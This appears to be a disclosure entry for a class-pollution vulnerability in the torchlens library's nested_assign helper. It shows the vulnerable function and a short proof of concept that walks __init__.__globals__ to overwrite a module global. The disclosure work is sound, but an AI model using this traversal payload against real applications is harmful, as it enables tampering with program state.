## torchlens

### Meta

+ Library: torchlens
+ Stars: 530
+ Version: 0.1.26
+ CVE: N/A
+ Status: Pending
+ Payload: ```torchlens.nested_assign(obj, [("attr", "__init__"), ("attr", "__globals__"), ("ind", "__name__") ], 'polluted')```
+ Foundby: Zhong
+ Report: Pending
+ Type: Lib
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/johnmarktaylor91/torchlens

### Vulnerable Code Snippet

```python
def nested_assign(obj, addr, val):
    """Given object and an address in that object, assign value to that address."""
    for i, (entry_type, entry_val) in enumerate(addr):
        if i == len(addr) - 1:
            if entry_type == "ind":
                obj[entry_val] = val
            elif entry_type == "attr":
                setattr(obj, entry_val, val)
        else:
            if entry_type == "ind":
                obj = obj[entry_val]
            elif entry_type == "attr":
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    obj = getattr(obj, entry_val)
```
### PoC

```python
from torchlens.helper_funcs import nested_assign
import random

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)
      

obj = Animal('cat', 11)
addr = [("attr", "__init__"), ("attr", "__globals__"), ("ind", "__name__") ]
nested_assign(obj, addr, 'polluted')

print(__name__)
```